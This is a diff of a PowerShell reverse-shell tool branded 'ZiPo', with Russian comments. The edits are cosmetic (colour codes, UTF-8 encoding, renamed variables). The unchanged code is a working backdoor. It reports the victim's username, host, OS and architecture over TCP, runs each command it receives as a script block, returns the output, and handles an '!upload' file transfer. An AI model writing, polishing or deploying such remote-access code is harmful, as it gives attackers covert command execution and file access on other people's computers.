@@ -23,7 +23,7 @@ function Connect-ZiPo {
             $stream = $tcp.GetStream()
             [byte[]]$buffer = 0..65535 | % { 0 }
 
-            # Очистка + баннер
+            # ANSI-цвета и баннер
             $esc = [char]27
             $clear = "$esc[2J$esc[H"
             $banner = @"
@@ -37,19 +37,20 @@ ${esc}[31m
         _\/\\\_______________\/\\\______________/\\\______\//\\\_     
          _\/\\\_______________\/\\\\\\\\\\\\\\\_\///\\\\\\\\\\\/__    
           _\///________________\///////////////____\///////////____${esc}[0m
-[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
+
+${esc}[32m[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
 OS: $([System.Environment]::OSVersion.VersionString)
-Architecture: $env:PROCESSOR_ARCHITECTURE
----------------------------------------------------${esc}[0m
+Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
+------------------------------------------------------------
 "@
 
             $intro = $clear + $banner + "`nPS " + (Get-Location) + "> "
-            $bbytes = [Text.Encoding]::ASCII.GetBytes($intro)
+            $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
 
             while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
-                $cmd = ([Text.Encoding]::ASCII).GetString($buffer, 0, $i).Trim()
+                $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()
 
                 try {
                     if ($cmd.StartsWith("!upload")) {
@@ -66,17 +67,16 @@ Architecture: $env:PROCESSOR_ARCHITECTURE
                     }
                     else {
                         $sb = [ScriptBlock]::Create($cmd)
-                        $result = & $sb 2>&1 | Out-String
-                        $response = $result.TrimEnd()  # убираем лишние переносы
+                        $output = & $sb 2>&1 | Out-String
+                        $response = $output.TrimEnd()
                     }
                 }
                 catch {
-                    $msg = $_.Exception.Message -replace '[^\x20-\x7E]', ''
-                    $response = "[ERROR] " + $msg
+                    $response = "[ERROR] $($_.Exception.Message)"
                 }
 
                 $response += "`nPS " + (Get-Location) + "> "
-                $outBytes = [Text.Encoding]::ASCII.GetBytes($response)
+                $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                 $stream.Write($outBytes, 0, $outBytes.Length)
                 $stream.Flush()
             }
